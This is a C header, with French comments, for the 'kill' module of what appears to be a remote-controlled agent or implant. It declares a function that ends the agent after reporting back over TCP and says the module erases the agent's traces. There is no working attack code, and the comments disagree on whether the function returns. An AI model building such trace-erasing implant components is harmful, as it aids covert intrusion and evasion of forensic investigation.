/*
 * ============================================================
 *  modules/mod_kill.h — Interface du module kill
 *
 *  Rôle : Déclare la fonction d'entrée du module de terminaison
 *         propre de l'agent avec suppression des traces.
 *
 *  Stratégie "deferred exit" :
 *    1. Écrit le message de fin dans ctx->output
 *    2. Lance un timer/thread de 3s en arrière-plan
 *    3. Retourne 1 normalement → core.c envoie le résultat via son
 *       flux normal (send_result), garantissant la réception.
 *    4. 3s plus tard : exit(0)
 *
 *  Ce design évite le bug "timeout 60s" causé par un exit(0)
 *  immédiat qui ferme le socket TCP avant l'envoi du résultat.
 * ============================================================
 */
#ifndef MOD_KILL_H
#define MOD_KILL_H

#include "module.h"

/**
 * Termine proprement l'agent et efface ses traces.
 * IMPORTANT : Cette fonction ne retourne jamais (appelle exit(0)).
 * La valeur de retour (int) est déclarée uniquement pour respecter
 * la signature ModuleFunc — elle ne sera jamais utilisée.
 */
int mod_kill_exec(ModuleContext *ctx);

#endif /* MOD_KILL_H */
